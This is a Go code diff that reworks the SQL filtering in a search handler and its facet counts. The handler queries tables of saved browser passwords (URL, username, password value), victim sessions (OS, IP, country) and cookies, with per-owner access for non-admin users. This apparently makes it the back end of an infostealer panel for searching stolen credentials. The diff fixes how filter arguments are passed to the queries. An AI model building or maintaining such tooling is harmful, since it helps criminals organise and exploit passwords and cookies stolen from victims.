@@ -157,49 +157,54 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 		perPage = 50
 	}
 
-	var conditions []string
-	var args []any
+	var passwordConds []string
+	var passwordArgs []any
+	var sessionConds []string
+	var sessionArgs []any
 
 	if q != "" {
 		like := "%" + q + "%"
-		conditions = append(conditions, "(p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)")
-		args = append(args, like, like, like)
+		passwordConds = append(passwordConds, "(p.url LIKE ? OR p.username LIKE ? OR p.password_value LIKE ?)")
+		passwordArgs = append(passwordArgs, like, like, like)
 	}
 	if osFilter != "" {
-		conditions = append(conditions, "s.os = ?")
-		args = append(args, osFilter)
+		sessionConds = append(sessionConds, "s.os = ?")
+		sessionArgs = append(sessionArgs, osFilter)
 	}
 	if browserFilter != "" {
-		conditions = append(conditions, "p.browser = ?")
-		args = append(args, browserFilter)
+		passwordConds = append(passwordConds, "p.browser = ?")
+		passwordArgs = append(passwordArgs, browserFilter)
 	}
 	if dateFrom != "" {
-		conditions = append(conditions, "s.created_at >= ?")
-		args = append(args, dateFrom)
+		sessionConds = append(sessionConds, "s.created_at >= ?")
+		sessionArgs = append(sessionArgs, dateFrom)
 	}
 	if dateTo != "" {
-		conditions = append(conditions, "s.created_at <= ?")
-		args = append(args, dateTo+" 23:59:59")
+		sessionConds = append(sessionConds, "s.created_at <= ?")
+		sessionArgs = append(sessionArgs, dateTo+" 23:59:59")
 	}
 
 	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
-		conditions = append(conditions, "s.owner_id = ?")
-		args = append(args, claims.UserID)
+		sessionConds = append(sessionConds, "s.owner_id = ?")
+		sessionArgs = append(sessionArgs, claims.UserID)
 	}
 
+	allConds := append(append([]string{}, passwordConds...), sessionConds...)
+	allArgs := append(append([]any{}, passwordArgs...), sessionArgs...)
+
 	sessionWhere := ""
-	if len(conditions) > 0 {
-		sessionWhere = " AND " + strings.Join(conditions, " AND ")
+	if len(allConds) > 0 {
+		sessionWhere = " AND " + strings.Join(allConds, " AND ")
 	}
 
 	countQuery := "SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1" + sessionWhere
 	var total int
-	db.QueryRow(h.db, countQuery, args...).Scan(&total)
+	db.QueryRow(h.db, countQuery, allArgs...).Scan(&total)
 
 	offset := (page - 1) * perPage
 	dataQuery := fmt.Sprintf(`SELECT p.session_id, p.url, p.username, p.password_value, p.browser, s.os, s.ip, s.country_code, s.created_at
 		FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE 1=1%s ORDER BY s.created_at DESC LIMIT ? OFFSET ?`, sessionWhere)
-	qargs := append(args, perPage, offset)
+	qargs := append(allArgs, perPage, offset)
 
 	rows, err := db.Query(h.db, dataQuery, qargs...)
 	if err != nil {
@@ -233,7 +238,7 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 
 	pages := (total + perPage - 1) / perPage
 
-	facets := h.buildAdvancedFacets(sessionWhere, args)
+	facets := h.buildAdvancedFacets(passwordConds, sessionConds, passwordArgs, sessionArgs)
 
 	writeJSON(w, http.StatusOK, map[string]any{
 		"results":  results,
@@ -245,19 +250,24 @@ func (h *SearchHandler) AdvancedSearch(w http.ResponseWriter, r *http.Request) {
 	})
 }
 
-func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []any) Facets {
+func (h *SearchHandler) buildAdvancedFacets(passwordConds, sessionConds []string, passwordArgs, sessionArgs []any) Facets {
 	facets := Facets{
 		Browsers: make(map[string]int),
 		OS:       make(map[string]int),
 		Domains:  make(map[string]int),
 	}
 
-	whereClause := ""
-	if sessionWhere != "" {
-		whereClause = " WHERE 1=1 " + sessionWhere
+	passwordWhere := " WHERE 1=1"
+	if len(passwordConds) > 0 {
+		passwordWhere += " AND " + strings.Join(passwordConds, " AND ")
 	}
+	sessionWhere := " WHERE 1=1"
+	if len(sessionConds) > 0 {
+		sessionWhere += " AND " + strings.Join(sessionConds, " AND ")
+	}
+	passwordAllArgs := append(append([]any{}, passwordArgs...), sessionArgs...)
 
-	rows, err := db.Query(h.db, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+whereClause+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows, err := db.Query(h.db, "SELECT p.browser, COUNT(*) as cnt FROM passwords p JOIN sessions s ON s.id = p.session_id"+passwordWhere+" GROUP BY p.browser ORDER BY cnt DESC LIMIT 10", passwordAllArgs...)
 	if err == nil {
 		defer rows.Close()
 		for rows.Next() {
@@ -269,7 +279,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows2, err := db.Query(h.db, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+whereClause+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows2, err := db.Query(h.db, "SELECT s.os, COUNT(*) as cnt FROM sessions s"+sessionWhere+" GROUP BY s.os ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows2.Close()
 		for rows2.Next() {
@@ -281,7 +291,7 @@ func (h *SearchHandler) buildAdvancedFacets(sessionWhere string, sessionArgs []a
 		}
 	}
 
-	rows3, err := db.Query(h.db, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+whereClause+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
+	rows3, err := db.Query(h.db, "SELECT c.domain, COUNT(*) as cnt FROM cookies c JOIN sessions s ON s.id = c.session_id"+sessionWhere+" GROUP BY c.domain ORDER BY cnt DESC LIMIT 10", sessionArgs...)
 	if err == nil {
 		defer rows3.Close()
 		for rows3.Next() {
